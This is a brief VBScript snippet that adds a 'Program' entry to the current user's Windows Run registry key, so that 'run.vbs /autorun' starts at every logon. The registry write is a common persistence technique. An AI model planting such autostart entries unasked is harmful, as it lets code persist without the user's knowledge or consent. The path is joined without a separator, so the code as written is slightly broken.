Dim vOrg, objArgs, root, key, WshShell 
root = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" 
KeyHP = "Program" 
Set WshShell = WScript.CreateObject("WScript.Shell")
CurrentPath = WshShell.CurrentDirectory 
WshShell.RegWrite root+keyHP, CurrentPath+"run.vbs /autorun" 